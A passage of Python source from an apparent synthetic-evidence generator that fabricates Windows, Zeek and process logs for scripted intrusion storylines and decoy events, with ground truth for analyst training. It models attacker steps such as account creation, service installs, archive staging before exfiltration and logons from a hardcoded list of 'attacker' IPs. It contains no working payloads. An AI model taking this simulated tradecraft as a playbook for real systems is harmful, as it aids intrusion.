        )
        if not isinstance(system_pids, dict):
            return actor
        for key in ("apache2", "httpd", "nginx", "php-fpm"):
            pid = int(system_pids.get(key, 0) or 0)
            if pid <= 0:
                continue
            proc = self.state_manager.get_process(system.hostname, pid)
            if proc is None or not proc.username:
                continue
            if isinstance(proc.start_time, datetime) and proc.start_time > time:
                continue
            native_username = proc.username
            if native_username == actor.username:
                return actor
            return User(
                username=native_username,
                full_name=f"{native_username} service",
                email=f"{native_username}@example.local",
                groups=list(actor.groups),
                enabled=actor.enabled,
                persona=actor.persona,
                primary_system=actor.primary_system,
            )
        return actor

    @staticmethod
    def _process_has_following_same_host_connection(
        system: System,
        future_specs: Iterable[Any],
    ) -> bool:
        """Return whether a just-created process owns a later same-host connection."""
        for future in future_specs:
            future_type = getattr(future, "type", "")
            if future_type == "connection":
                source_ip = getattr(future, "source_ip", None) or system.ip
                if source_ip == system.ip:
                    return True
                continue
            if future_type in {"process", "logoff", "logon", "ssh_session"}:
                return False
        return False

    @staticmethod
    def _scheduled_task_lookup_key(system: System, task_name: str) -> tuple[str, str]:
        """Return a normalized host/task key for correlating schtasks with 4698."""
        normalized_task = task_name.strip().strip('"').replace("/", "\\")
        if not normalized_task.startswith("\\"):
            normalized_task = f"\\{normalized_task}"
        return system.hostname, normalized_task.lower()

    def _record_storyline_scheduled_task_command(
        self,
        system: System,
        task_name: str,
        command_line: str,
    ) -> None:
        """Remember a schtasks.exe command so the later 4698 XML matches it."""
        if not task_name or not command_line:
            return
        if not hasattr(self, "_storyline_scheduled_task_commands"):
            self._storyline_scheduled_task_commands: dict[tuple[str, str], str] = {}
        self._storyline_scheduled_task_commands[
            self._scheduled_task_lookup_key(system, task_name)
        ] = command_line

    def _recent_storyline_scheduled_task_command(
        self,
        system: System,
        task_name: str,
    ) -> str:
        """Return the most recent schtasks.exe command for a host/task pair."""
        commands = getattr(self, "_storyline_scheduled_task_commands", {})
        return commands.get(self._scheduled_task_lookup_key(system, task_name), "")

    @staticmethod
    def _account_create_lookup_key(system: System, username: str) -> tuple[str, str]:
        """Return a normalized lookup key for account-creation command metadata."""
        return (system.hostname.lower(), username.strip().strip('"').lower())

    def _record_storyline_account_create_command(
        self,
        system: System,
        command_line: str,
    ) -> None:
        """Remember password-bearing net user /add commands for explicit 4720 events."""
        match = _NET_USER_ADD_WITH_PASSWORD_RE.search(command_line)
        if match is None:
            return
        if not hasattr(self, "_storyline_account_create_commands"):
            self._storyline_account_create_commands: dict[tuple[str, str], str] = {}
        self._storyline_account_create_commands[
            self._account_create_lookup_key(system, match.group("username"))
        ] = command_line

    def _recent_storyline_account_create_command(
        self,
        system: System,
        username: str,
    ) -> str:
        """Return the recent net user /add command for an explicit account-created event."""
        commands = getattr(self, "_storyline_account_create_commands", {})
        return commands.get(self._account_create_lookup_key(system, username), "")

    @staticmethod
    def _storyline_host_actor_key(system: System, actor: User) -> tuple[str, str]:
        """Return the host/actor key used for in-step action readiness."""
        return (system.hostname, actor.username.strip().lower())

    def _record_storyline_host_available_after(
        self,
        *,
        system: System,
        actor: User,
        time: datetime,
        rng: random.Random,
    ) -> None:
        """Delay later same-host commands until a prior audit effect is visible."""
        if not hasattr(self, "_storyline_host_available_at"):
            self._storyline_host_available_at: dict[tuple[str, str], datetime] = {}
        delay = timedelta(milliseconds=rng.randint(180, 950))
        key = self._storyline_host_actor_key(system, actor)
        available_at = time + delay
        self._storyline_host_available_at[key] = max(
            available_at,
            self._storyline_host_available_at.get(key, available_at),
        )

    def _emit_storyline_account_password_followups(
        self,
        actor: User,
        system: System,
        time: datetime,
        target_username: str,
        target_sid: str,
    ) -> None:
        """Emit password and account-attribute follow-ups for net user password adds."""
        from evidenceforge.generation.activity.timing_profiles import get_timing_window

        reset_window = get_timing_window(
            "windows.account_password_reset_from_add",
            default_min_ms=950,
            default_max_ms=1800,
            default_position="after",
        )
        change_window = get_timing_window(
            "windows.account_attributes_from_add",
            default_min_ms=1850,
            default_max_ms=3200,
            default_position="after",
        )
        rng = random.Random(
            _stable_seed(
                f"storyline_account_followups:{system.hostname}:"
                f"{target_username}:{time.isoformat()}"
            )
        )
        reset_time = time + timedelta(
            milliseconds=rng.randint(reset_window.min_ms, reset_window.max_ms)
        )
        change_time = time + timedelta(
            milliseconds=rng.randint(change_window.min_ms, change_window.max_ms)
        )
        self.activity_generator.generate_password_reset(
            actor=actor,
            system=system,
            time=reset_time,
            target_username=target_username,
            target_sid=target_sid,
        )
        self.activity_generator.generate_account_changed(
            actor=actor,
            system=system,
            time=change_time,
            target_username=target_username,
            target_sid=target_sid,
            password_last_set_to_event_time=True,
            old_uac_value="0x15",
            new_uac_value="0x10",
            user_account_control="\n\t\t\t%%2081",
            primary_group_id="-",
        )

    @staticmethod
    def _service_lookup_key(system: System, service_name: str) -> tuple[str, str]:
        """Return a normalized lookup key for host-local service metadata."""
        return (system.hostname.lower(), service_name.lower())

    def _record_storyline_service_create_command(
        self,
        system: System,
        command_line: str,
    ) -> None:
        """Remember an sc.exe create command so the later 4697 fields match it."""
        parsed = _extract_sc_create_service_start_type(command_line)
        if parsed is None:
            return
        service_name, service_start_type = parsed
        if not hasattr(self, "_storyline_service_start_types"):
            self._storyline_service_start_types: dict[tuple[str, str], str] = {}
        self._storyline_service_start_types[self._service_lookup_key(system, service_name)] = (
            service_start_type
        )

    def _recent_storyline_service_start_type(
        self,
        system: System,
        service_name: str,
    ) -> str:
        """Return a service start type inferred from a preceding sc.exe command."""
        start_types = getattr(self, "_storyline_service_start_types", {})
        return start_types.get(self._service_lookup_key(system, service_name), "3")

    def _ensure_storyline_service_process_for_beacon(
        self,
        actor: User,
        system: System | None,
        time: datetime,
    ) -> tuple[int, str | None]:
        """Create or reuse a storyline service process to own service-backed beacons."""
        if system is None or _get_os_category(system.os) != "windows":
            return -1, None
        services = getattr(self, "_last_storyline_service_by_system", {})
        service = services.get(system.hostname)
        if not service:
            return -1, None
        service_file_name = str(service.get("service_file_name") or "")
        if not service_file_name:
            return -1, None
        service_file_name = self._normalize_storyline_service_file_name(service_file_name)

        image_lower = service_file_name.lower()
        service_exe = service_file_name.rsplit("\\", 1)[-1].lower()
        running = [
            proc
            for proc in self.state_manager.get_processes_on_system(system.hostname)
            if proc.image.lower() == image_lower
            and proc.start_time is not None
            and proc.start_time <= time
            and (service_exe != "psexesvc.exe" or time - proc.start_time <= timedelta(minutes=2))
        ]
        if running:
            proc = max(running, key=lambda candidate: candidate.start_time)
            self.activity_generator._record_user_process(system, actor, proc.pid, proc.image)
            self._record_last_storyline_process(system, proc.pid, proc.image)
            return proc.pid, proc.image

        installed_at = service.get("installed_at")
        process_time = time - timedelta(seconds=45)
        if isinstance(installed_at, datetime):
            process_time = max(process_time, installed_at + timedelta(seconds=1))
        if service_exe == "psexesvc.exe":
            start_lead_ms = 500 + (
                _stable_seed(f"storyline_psexesvc_start:{system.hostname}:{time.isoformat()}")
                % 2500
            )
            process_time = time - timedelta(milliseconds=start_lead_ms)
            if isinstance(installed_at, datetime):
                process_time = max(process_time, installed_at + timedelta(seconds=1))
        if process_time >= time:
            process_time = time - timedelta(milliseconds=100)

        parent_pid = self.activity_generator._get_system_pid(system.hostname, "services", 0x2BC)
        pid = self.activity_generator.generate_process(
            user=actor,
            system=system,
            time=process_time,
            logon_id="0x3e7",
            process_name=service_file_name,
            command_line=service_file_name,
            parent_pid=parent_pid,
            ensure_file_event=False,
            from_storyline=True,
            suppress_command_file_effect=True,
        )
        self.activity_generator._record_user_process(system, actor, pid, service_file_name)
        self._record_last_storyline_process(system, pid, service_file_name)
        if service_exe == "psexesvc.exe":
            ttl_ms = 8000 + (
                _stable_seed(f"storyline_psexesvc_ttl:{system.hostname}:{pid}:{time.isoformat()}")
                % 37000
            )
            self._queue_story_process_termination(
                actor=actor,
                system=system,
                time=time + timedelta(milliseconds=ttl_ms),
                pid=pid,
                process_name=service_file_name,
                logon_id="0x3e7",
            )
        return pid, service_file_name

    def _record_storyline_logon(
        self,
        actor: User,
        system: System,
        logon_id: str,
        source_ip: str | None = None,
    ) -> None:
        """Record the latest storyline-created session by actor and target host."""
        if not hasattr(self, "_last_storyline_logon_by_actor_system"):
            self._last_storyline_logon_by_actor_system: dict[tuple[str, str], str] = {}
        self._last_storyline_logon_by_actor_system[(actor.username, system.hostname)] = logon_id
        if source_ip is None and hasattr(self, "state_manager"):
            get_session = getattr(self.state_manager, "get_session", None)
            if callable(get_session):
                session = get_session(logon_id)
                source_ip = getattr(session, "source_ip", "") if session is not None else None
        if source_ip:
            if not hasattr(self, "_last_storyline_logon_source_by_actor_system"):
                self._last_storyline_logon_source_by_actor_system: dict[tuple[str, str], str] = {}
            self._last_storyline_logon_source_by_actor_system[(actor.username, system.hostname)] = (
                source_ip
            )

    def _last_storyline_logon_for_actor_system(
        self,
        actor: User,
        system: System,
        at_time: datetime | None = None,
    ) -> str | None:
        """Return the latest storyline-created active LogonID for this actor/host."""
        logons = getattr(self, "_last_storyline_logon_by_actor_system", {})
        logon_id = logons.get((actor.username, system.hostname))
        if not logon_id:
            return None
        if at_time is not None:
            valid_sessions = self.state_manager.get_sessions_for_user_at(actor.username, at_time)
            if not any(
                session.logon_id == logon_id and session.system == system.hostname
                for session in valid_sessions
            ):
                return None
        session = self.state_manager.get_session(logon_id)
        if session is None or session.system != system.hostname:
            return None
        return logon_id

    def _last_storyline_logon_source_for_actor_system(
        self,
        actor: User,
        system: System,
        at_time: datetime | None = None,
    ) -> str | None:
        """Return the latest storyline network-logon source for this actor/host."""
        if self._last_storyline_logon_for_actor_system(actor, system, at_time=at_time) is None:
            return None
        sources = getattr(self, "_last_storyline_logon_source_by_actor_system", {})
        return sources.get((actor.username, system.hostname))

    def _next_storyline_logoff_time_for_actor_system(
        self,
        actor: User,
        system: System,
        after_time: datetime,
    ) -> datetime | None:
        """Return the next planned storyline logoff for this actor and host."""
        future_logoffs: list[datetime] = []
        after_time = after_time.replace(tzinfo=UTC) if after_time.tzinfo is None else after_time
        after_time = after_time.astimezone(UTC)
        for storyline_event in self.scenario.storyline:
            if storyline_event.actor != actor.username or storyline_event.system != system.hostname:
                continue
            event_time = self._parse_storyline_time(storyline_event.time)
            event_time = event_time.replace(tzinfo=UTC) if event_time.tzinfo is None else event_time
            event_time = event_time.astimezone(UTC)
            if event_time <= after_time:
                continue
            if any(spec.type == "logoff" for spec in storyline_event.events):
                future_logoffs.append(event_time)
        return min(future_logoffs) if future_logoffs else None

    @staticmethod
    def _extract_compress_archive_destination(command_line: str) -> str | None:
        """Extract a PowerShell Compress-Archive destination path."""
        if "compress-archive" not in command_line.lower():
            return None
        match = re.search(
            r"-DestinationPath\s+(?:\"([^\"]+)\"|'([^']+)'|([^\s;]+))",
            command_line,
            re.IGNORECASE,
        )
        if not match:
            return None
        destination = next(group for group in match.groups() if group)
        destination = destination.strip().strip("\"'").rstrip(");,")
        return destination or None

    @staticmethod
    def _smb_filename_for_staged_archive(system: System, archive_path: str) -> str:
        """Return a Zeek files.log filename for a staged archive read over SMB."""
        if archive_path.startswith("\\\\"):
            return archive_path
        drive_match = re.match(r"^([A-Za-z]):[\\/](.+)$", archive_path)
        if drive_match:
            drive = drive_match.group(1).upper()
            rest = drive_match.group(2).replace("/", "\\")
            return f"\\\\{system.hostname}\\{drive}$\\{rest}"
        normalized = archive_path.replace("/", "\\")
        normalized = normalized.lstrip("\\")
        return f"\\\\{system.hostname}\\{normalized}"

    def _record_storyline_staged_archive(
        self,
        *,
        actor: User,
        system: System,
        archive_path: str,
        source_ip: str,
        staged_at: datetime,
    ) -> None:
        """Remember an archive staged on a server by a remote source host."""
        if not source_ip or not archive_path:
            return
        if not hasattr(self, "_storyline_staged_archives"):
            self._storyline_staged_archives: list[SimpleNamespace] = []
        self._storyline_staged_archives.append(
            SimpleNamespace(
                actor=actor,
                staging_host=system.hostname,
                staging_ip=system.ip,
                source_ip=source_ip,
                archive_path=archive_path,
                smb_filename=self._smb_filename_for_staged_archive(system, archive_path),
                staged_at=staged_at,
                consumed=False,
            )
        )

    def _matching_storyline_staged_archive_for_exfil(
        self,
        *,
        source_ip: str,
        exfil_time: datetime,
    ) -> SimpleNamespace | None:
        """Find the most recent unconsumed staged archive for this exfil source."""
        archives = getattr(self, "_storyline_staged_archives", [])
        horizon = timedelta(hours=6)
        candidates = [
            archive
            for archive in archives
            if not archive.consumed
            and archive.source_ip == source_ip
            and archive.staged_at <= exfil_time
            and exfil_time - archive.staged_at <= horizon
        ]
        if not candidates:
            return None
        return max(candidates, key=lambda archive: archive.staged_at)

    def _emit_storyline_archive_transfer_before_exfil(
        self,
        *,
        source_ip: str,
        exfil_time: datetime,
        upload_bytes: int,
        rng: random.Random,
    ) -> None:
        """Emit the SMB read that moves a staged archive to the upload host."""
        if upload_bytes < 1_000_000:
            return
        archive = self._matching_storyline_staged_archive_for_exfil(
            source_ip=source_ip,
            exfil_time=exfil_time,
        )
        if archive is None:
            return
        target_system = self._system_for_ip(archive.staging_ip)
        if target_system is None:
            return
        source_system = self._system_for_ip(source_ip)
        emitted = StagedArchiveSmbReadActionBundle(
            self,
            StagedArchiveSmbReadRequest(
                actor=archive.actor,
                source_ip=archive.source_ip,
                staging_ip=archive.staging_ip,
                archive_path=archive.archive_path,
                smb_filename=archive.smb_filename,
                staged_at=archive.staged_at,
                exfil_time=exfil_time,
                upload_bytes=upload_bytes,
                source_system=source_system,
                target_system=target_system,
            ),
            rng,
            emit_smb_logon_pair=getattr(self, "_emit_smb_logon_pair", None),
        ).execute()
        if emitted:
            archive.consumed = True

    def _last_storyline_process_for_system(self, system: System | None) -> tuple[int, str | None]:
        """Return the last live storyline process for the same source host."""
        if system is None:
            return -1, None
        processes = getattr(self, "_last_storyline_process_by_system", {})
        pid, image = processes.get(system.hostname, (-1, ""))
        if pid <= 0 or not image:
            return -1, None

        os_category = _get_os_category(system.os)
        if os_category == "windows" and image.startswith("/"):
            return -1, None
        if os_category == "linux" and re.match(r"^[A-Za-z]:\\", image):
            return -1, None
        if self.state_manager.get_process(system.hostname, pid) is None:
            processes.pop(system.hostname, None)
            if getattr(self, "_last_storyline_system", None) == system.hostname:
                self._last_storyline_pid = -1
                self._last_storyline_image = ""
                self._last_storyline_system = ""
            return -1, None
        return pid, image

    def _clamp_after_storyline_process_source_create(
        self,
        *,
        system: System | None,
        pid: int,
        network_time: datetime,
        rng: random.Random,
    ) -> datetime:
        """Keep process-owned storyline network evidence after visible process creation."""
        if system is None or pid <= 0:
            return network_time
        source_time_getter = getattr(self.activity_generator, "process_source_create_time", None)
        if not callable(source_time_getter):
            return network_time
        process_source_time = source_time_getter(system.hostname, pid)
        if not isinstance(process_source_time, datetime) or network_time > process_source_time:
            return network_time
        return process_source_time + timedelta(milliseconds=rng.randint(120, 700))

    def _clamp_after_recent_storyline_process_source_create(
        self,
        *,
        system: System | None,
        event_time: datetime,
        rng: random.Random,
    ) -> datetime:
        """Keep storyline effects after the last visible source process creation."""
        if system is None:
            return event_time
        pid, _image = self._last_storyline_process_for_system(system)
        return self._clamp_after_storyline_process_source_create(
            system=system,
            pid=pid,
            network_time=event_time,
            rng=rng,
        )

    def _recent_storyline_process_logon_id(
        self,
        actor: User,
        system: System,
        time: datetime,
        *,
        executable: str | None = None,
    ) -> str | None:
        """Return a recent storyline process LogonID for this actor and host."""
        pid, image = self._last_storyline_process_for_system(system)
        if pid <= 0 or not image:
            return None
        if executable:
            image_name = image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            if image_name != executable.lower():
                return None
        proc = self.state_manager.get_process(system.hostname, pid)
        if proc is None or proc.username != actor.username or not proc.logon_id:
            return None
        session = self.state_manager.get_session(proc.logon_id)
        if (
            session is None
            or session.username != actor.username
            or session.system != system.hostname
        ):
            return None
        if proc.start_time is None or proc.start_time > time:
            return None
        if time - proc.start_time > timedelta(minutes=5):
            return None
        return proc.logon_id

    def _queue_story_process_termination(
        self,
        *,
        actor: User,
        system: System,
        time: datetime,
        pid: int,
        process_name: str,
        logon_id: str,
    ) -> None:
        """Defer storyline process termination until all same-step dependents run."""
        if not hasattr(self, "_pending_story_process_terminations"):
            self._pending_story_process_terminations = []
        self._pending_story_process_terminations.append(
            {
                "actor": actor,
                "system": system,
                "time": time,
                "pid": pid,
                "process_name": process_name,
                "logon_id": logon_id,
            }
        )

    def _flush_story_process_terminations(self) -> None:
        """Emit deferred storyline terminations after process activity is complete."""
        pending = getattr(self, "_pending_story_process_terminations", [])
        if not pending:
            return
        self._pending_story_process_terminations = []
        for item in pending:
            proc = self.state_manager.get_process(item["system"].hostname, item["pid"])
            if proc is None:
                continue
            self.activity_generator.generate_process_termination(
                user=item["actor"],
                system=item["system"],
                time=item["time"],
                pid=item["pid"],
                process_name=item["process_name"],
                logon_id=item["logon_id"],
                from_storyline=True,
            )

    def _apply_storyline_shell_availability(
        self,
        *,
        actor: User,
        system: System,
        time: datetime,
        rng: random.Random,
    ) -> datetime:
        """Delay same-host storyline siblings until prior actions and shells are ready."""
        host_ready = getattr(self, "_storyline_host_available_at", {}).get(
            self._storyline_host_actor_key(system, actor)
        )
        if host_ready is not None and time < host_ready:
            time = host_ready + timedelta(milliseconds=rng.randint(120, 700))
        if _get_os_category(system.os) != "linux":
            return time
        available_at = getattr(self, "_storyline_shell_available_at", {}).get(
            (system.hostname, actor.username)
        )
        if available_at is None or time >= available_at:
            return time
        return available_at + timedelta(seconds=rng.uniform(0.3, 2.0))

    def _execute_storyline(self) -> None:
        """Execute storyline events (malicious/suspicious activities).

        Parses storyline events, executes them at specified times, and tracks
        them for GROUND_TRUTH.md generation. Implements baseline suppression
        (+/-5 min window) to avoid conflicts with baseline activity.

        Phase 1 Implementation:
        - Simple keyword matching for activity types
        - Basic event generation based on activity description
        - Tracking of malicious events for ground truth
        """
        total_events = len(self.scenario.storyline)
        _prev_event_time = None
        self._ensure_account_sid_tracking()

        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
            event_time = self._parse_storyline_time(storyline_event.time)
            rng = _get_rng()
            jitter = timedelta(
                seconds=rng.uniform(-30, 30),
                microseconds=rng.randint(0, 999999),
            )
            event_time = event_time + jitter
            if _prev_event_time and event_time <= _prev_event_time:
                event_time = _prev_event_time + timedelta(milliseconds=rng.randint(100, 5000))

            actor = self._find_actor(storyline_event.actor)
            system = self._find_system(storyline_event.system)

            if not actor or not system:
                logger.warning(
                    f"Skipping storyline event: actor={storyline_event.actor}, "
                    f"system={storyline_event.system} not found"
                )
                continue

            logger.info(
                f"Executing storyline event: {storyline_event.actor} on "
                f"{storyline_event.system} at {event_time}"
            )

            self._report_progress(
                "storyline_progress",
                {
                    "event_num": event_num,
                    "total_events": total_events,
                    "actor": actor.username,
                    "system": system.hostname,
                },
            )

            self.state_manager.set_current_time(event_time)
            explicit_types = {spec.type for spec in storyline_event.events}

            # Apply human typing cadence: space events in a step with
            # realistic inter-action delays instead of shared timestamps
            from evidenceforge.utils.timing import typing_cadence

            cadence_offsets = typing_cadence(len(storyline_event.events), rng)

            previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
            self.dispatcher.storyline_cluster_id = storyline_event.id
            try:
                for i, spec in enumerate(storyline_event.events):
                    event_t = event_time + timedelta(seconds=cadence_offsets[i])
                    event_t = self._apply_storyline_shell_availability(
                        actor=actor,
                        system=system,
                        time=event_t,
                        rng=rng,
                    )
                    self.state_manager.set_current_time(event_t)
                    malicious_event = self._execute_typed_event(
                        spec=spec,
                        actor=actor,
                        system=system,
                        time=event_t,
                        activity=storyline_event.activity,
                        explicit_types=explicit_types,
                        future_specs=itertools.islice(storyline_event.events, i + 1, None),
                    )
                    if malicious_event:
                        self.malicious_events.append(malicious_event)
                self._flush_story_process_terminations()
            finally:
                self.dispatcher.storyline_cluster_id = previous_cluster

            if cadence_offsets:
                _prev_event_time = event_time + timedelta(seconds=cadence_offsets[-1])
            else:
                _prev_event_time = event_time

            self._barrier_flush_all_emitters()

    def _execute_single_storyline_event(self, event_idx: int) -> None:
        """Execute a single storyline event by index (used for interleaved generation)."""
        self._ensure_account_sid_tracking()
        storyline_event = self.scenario.storyline[event_idx]
        event_idx + 1

        event_time = self._parse_storyline_time(storyline_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(storyline_event.actor)
        system = self._find_system(storyline_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in storyline_event.events}

        # Apply human typing cadence for intra-step event spacing
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(storyline_event.events), rng)

        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
        self.dispatcher.storyline_cluster_id = storyline_event.id
        try:
            for i, spec in enumerate(storyline_event.events):
                event_t = event_time + timedelta(seconds=cadence_offsets[i])
                event_t = self._apply_storyline_shell_availability(
                    actor=actor,
                    system=system,
                    time=event_t,
                    rng=rng,
                )
                self.state_manager.set_current_time(event_t)
                malicious_event = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_t,
                    activity=storyline_event.activity,
                    explicit_types=explicit_types,
                    future_specs=itertools.islice(storyline_event.events, i + 1, None),
                )
                if malicious_event:
                    self.malicious_events.append(malicious_event)
            self._flush_story_process_terminations()
        finally:
            self.dispatcher.storyline_cluster_id = previous_cluster

    def _execute_single_red_herring_event(self, event_idx: int) -> None:
        """Execute a single red herring event by index.

        Uses the same event execution path as storyline events but tracks
        results in red_herring_events instead of malicious_events.
        """
        self._ensure_account_sid_tracking()
        rh_event = self.scenario.red_herrings[event_idx]

        event_time = self._parse_storyline_time(rh_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(rh_event.actor)
        system = self._find_system(rh_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing red herring event: {rh_event.actor} on {rh_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in rh_event.events}

        # Apply typing cadence so logon events precede process events
        # within compound red herring steps (same as storyline events)
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(rh_event.events), rng)

        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
        self.dispatcher.storyline_cluster_id = f"red_herring:{rh_event.id}"
        try:
            for i, spec in enumerate(rh_event.events):
                event_t = event_time + timedelta(seconds=cadence_offsets[i])
                event_t = self._apply_storyline_shell_availability(
                    actor=actor,
                    system=system,
                    time=event_t,
                    rng=rng,
                )
                self.state_manager.set_current_time(event_t)
                result = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_t,
                    activity=rh_event.activity,
                    explicit_types=explicit_types,
                    future_specs=itertools.islice(rh_event.events, i + 1, None),
                )
                if result:
                    # Track as red herring, not malicious
                    result["explanation"] = rh_event.explanation
                    self.red_herring_events.append(result)
            self._flush_story_process_terminations()
        finally:
            self.dispatcher.storyline_cluster_id = previous_cluster

    def _execute_typed_event(
        self,
        spec,  # EventSpec union type
        actor: User,
        system: System,
        time: datetime,
        activity: str,
        explicit_types: set[str],
        future_specs: Sequence[Any] = (),
    ) -> dict | None:
        """Execute a single typed event from the storyline events list.

        Each event spec type maps to a specific generate_* method on ActivityGenerator.
        Returns a malicious_event dict for GROUND_TRUTH.md.
        """
        rng = _get_rng()
        dispatcher = getattr(self, "dispatcher", None)
        malicious_event = {
            "time": time,
            "actor": actor.username,
            "system": system.hostname,
            "activity": activity,
            "type": spec.type,
            "storyline_cluster_id": getattr(dispatcher, "storyline_cluster_id", None),
        }

        def _ground_truth_uid(uid: str, src_ip: str, dst_ip: str) -> str:
            if not uid:
                return "(filtered by sensor placement)"
            visibility = getattr(dispatcher, "visibility_engine", None)
            if visibility is None:
                return uid
            from evidenceforge.events.dispatcher import expand_formats
            from evidenceforge.generation.emitters.zeek_base import SensorMultiplexEmitter

            for sensor in visibility.get_observing_sensors(src_ip, dst_ip):
                if "zeek_conn" in expand_formats(sensor.log_formats):
                    hostname = sensor.hostname or sensor.name
                    return SensorMultiplexEmitter._derive_sensor_uid(uid, hostname)
            return "(filtered by sensor placement)"

        if spec.type == "logon":
            _attacker_ips = [
                "45.33.32.156",
                "185.220.101.34",
                "91.219.236.174",
                "23.129.64.210",
                "116.202.120.181",
            ]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            logon_id = self.activity_generator.generate_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
            )
            # Protect storyline-created sessions from baseline logoff
            session = self.state_manager.get_session(logon_id)
            if session:
                session.storyline_protected = True
            malicious_event["logon_id"] = logon_id
            malicious_event["source_ip"] = source_ip
            self._record_storyline_logon(actor, system, logon_id, source_ip=source_ip)

        elif spec.type == "failed_logon":
            _attacker_ips = ["45.33.32.156", "185.220.101.34", "91.219.236.174"]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                None,
            )
            self.activity_generator.generate_failed_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
                target_username=getattr(spec, "target_username", None),
                dc_system=dc,
            )
            malicious_event["source_ip"] = source_ip

        elif spec.type == "logoff":
            sessions = [
                session
                for session in self.state_manager.get_sessions_for_user(actor.username)
                if session.system == system.hostname
            ]
            target_session = max(
                sessions,
                key=lambda session: session.start_time,
                default=None,
            )
            if target_session:
                self.activity_generator.generate_logoff(
                    actor, system, time, target_session.logon_id, from_storyline=True
                )

        elif spec.type == "process":
            os_category = _get_os_category(system.os)
            if hasattr(self, "world_planner"):
                # Built-in/service accounts (SYSTEM, LOCAL SERVICE, etc.) run
                # locally — don't fabricate remote logon evidence for them.
                from evidenceforge.validation.schema import BUILTIN_ACCOUNTS

                service_accounts = set(self.scenario.environment.service_accounts)
                is_local_account = (
                    actor.username in BUILTIN_ACCOUNTS or actor.username in service_accounts
                )
                is_interactive_linux_root = os_category == "linux" and actor.username == "root"
                if is_local_account and not is_interactive_linux_root:
                    linux_daemon_users = {"apache", "www-data", "nginx", "httpd", "tomcat"}
                    if os_category == "linux" and actor.username.lower() in linux_daemon_users:
                        logon_id = ""
                    else:
                        # Use existing system session or create a service logon.
                        sessions = self.state_manager.get_sessions_for_user_at(
                            actor.username,
                            time,
                        )
                        target_session = max(
                            (s for s in sessions if s.system == system.hostname),
                            key=lambda session: session.start_time,
                            default=None,
                        )
                        if target_session:
                            logon_id = target_session.logon_id
                        else:
                            logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                            logon_id = self.activity_generator.generate_service_logon(
                                system=system,
                                time=logon_time,
                                service_account=actor.username,
                            )
                else:
                    logon_id = self._last_storyline_logon_for_actor_system(
                        actor,
                        system,
                        at_time=time,
                    )
                    if logon_id is None:
                        required_until = self._next_storyline_logoff_time_for_actor_system(
                            actor,
                            system,
                            time,
                        )
                        if required_until is not None:
                            required_until += timedelta(minutes=2)
                        # Pre-compute the session kind via the planner so reuse
                        # filtering matches the correct transport type.
                        plan = self.world_model.plan_session(
                            user=actor,
                            target_system=system,
                            rng=rng,
                        )
                        target_session = self.world_planner.ensure_user_session(
                            actor,
                            system,
                            time,
                            rng,
                            session_kind=plan.session_kind,
                            storyline_protected=True,
                            required_until=required_until,
                        )
                        logon_id = target_session.logon_id
                        self._record_storyline_logon(actor, system, logon_id)
            else:
                sessions = self.state_manager.get_sessions_for_user(actor.username)
                target_session = max(
                    (s for s in sessions if s.system == system.hostname),
                    key=lambda session: session.start_time,
                    default=None,
                )
                if not target_session:
                    logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                    logon_id = self.activity_generator.generate_logon(
                        actor, system, logon_time, logon_type=3
                    )
                    self._record_storyline_logon(actor, system, logon_id)
                else:
                    logon_id = target_session.logon_id

            process_actor = self._linux_native_service_user_for_storyline_actor(
                actor,
                system,
                time,
            )
            process_name = _normalize_storyline_process_image(
                spec.process_name,
                os_category,
                username=process_actor.username,
            )
            command_line = spec.command_line or process_name
            shell_key = (system.hostname, process_actor.username)

            if os_category == "linux":
                if not hasattr(self, "_storyline_shell_available_at"):
                    self._storyline_shell_available_at: dict[tuple[str, str], datetime] = {}
                available_times = [
                    ts
                    for key in {shell_key, (system.hostname, actor.username)}
                    if (ts := self._storyline_shell_available_at.get(key)) is not None
                ]
                available_at = max(available_times) if available_times else None
                if available_at is not None and time < available_at:
                    time = available_at + timedelta(seconds=rng.uniform(0.3, 2.0))

            if "<base64_encoded_command>" in command_line:
                command_line = command_line.replace(
                    "<base64_encoded_command>",
                    self._generate_encoded_powershell(
                        _stable_seed(f"storyline_ps_{time.isoformat()}_{actor.username}")
                    ),
                )

            process_command_line = command_line
            if os_category == "linux":
                from evidenceforge.generation.activity.generator import (
                    _linux_command_process_from_shell,
                )

                inferred_process = _linux_command_process_from_shell(
                    command_line,
                    username=process_actor.username,
                )
                if inferred_process is not None:
                    inferred_image, inferred_command_line = inferred_process
                    if inferred_image.rsplit("/", 1)[-1] == process_name.rsplit("/", 1)[-1]:
                        process_command_line = inferred_command_line
                shell_command_line = _linux_shell_process_command_line(
                    process_name,
                    process_command_line,
                )
                if shell_command_line is not None:
                    process_command_line = shell_command_line

            output_file = self._extract_output_file(command_line, os_category)
            process_logon_id = logon_id
            service_context = self._storyline_service_context_for_process(
                actor=process_actor,
                system=system,
                time=time,
                process_name=process_name,
            )
